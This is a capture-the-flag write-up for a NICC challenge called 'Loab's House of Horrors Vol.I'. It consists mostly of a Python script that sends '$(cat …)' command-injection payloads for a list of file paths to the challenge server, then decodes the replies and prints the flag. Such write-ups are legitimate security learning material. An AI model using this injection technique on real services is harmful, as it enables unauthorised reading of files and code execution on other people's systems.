# Loab's House of Horrors Vol.I

Solved by: @OS1R1S

## Question:
It sounds like Loab is back and luring students into their trap. Thankfully Anna managed to rip the source code before Loab left the NJIT network. If we can find the flag we might be able to shut this down!


## Solution:
1. Run Script
2. Lookout for NICC

```
import socket
import base64

host = "loabshouse.niccgetsspooky.xyz"
port = 1337

locations = [
    "/tmp/singularity", "/tmp/abyss", "/tmp/orphans", "/home/council",
    "/tmp/.boom", "/home/victim/.consortium", "/usr/bnc/.yummyarbs",
    "/tmp/.loab", "/tmp/loab"
]

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.setblocking(False)  # Set the socket to non-blocking mode
    return s

def decode_and_print(response_text):
    print("Raw response:")
    print(response_text)
    for part in response_text.split():
        try:
            decoded_part = base64.b64decode(part).decode()
            print("Decoded output:", decoded_part)
        except Exception:
            continue

try:
    s = connect_to_server()

    data = b""
    while True:
        try:
            data += s.recv(4096)
            if not data:
                break
            if b"Who dares enter my realm:" in data:
                break  # Stop reading initial message once prompt is detected
        except BlockingIOError:
            continue
    print(data.decode())

    for location in locations:
        payload = f"$(cat {location})\n".encode()

        for _ in range(2):  # Send each payload twice
            try:
                s.sendall(payload)
                data = b""

                # Continuously read response without blocking
                while True:
                    try:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                    except BlockingIOError:
                        if data:
                            break  # If data has been gathered, exit the loop to process

                response_text = data.decode()
                decode_and_print(response_text)

                if "Goodbye" in response_text:
                    print("Received 'Goodbye' - restarting connection...")
                    s.close()
                    s = connect_to_server()

                    data = b""
                    while True:
                        try:
                            data += s.recv(4096)
                            if not data:
                                break
                            if b"Who dares enter my realm:" in data:
                                break
                        except BlockingIOError:
                            continue
                    print(data.decode())
                    break

            except BrokenPipeError:
                print("Connection lost. Reconnecting...")
                s.close()
                s = connect_to_server()

                # Re-receive initial message on reconnection
                data = b""
                while True:
                    try:
                        data += s.recv(4096)
                        if not data:
                            break
                        if b"Who dares enter my realm:" in data:
                            break
                    except BlockingIOError:
                        continue
                print(data.decode())

finally:
    s.close()
    ```

**Flag:** `NICC{Ju5t_pu7_l0@b_1n_rc3_or_h311_i_gu3ss}`
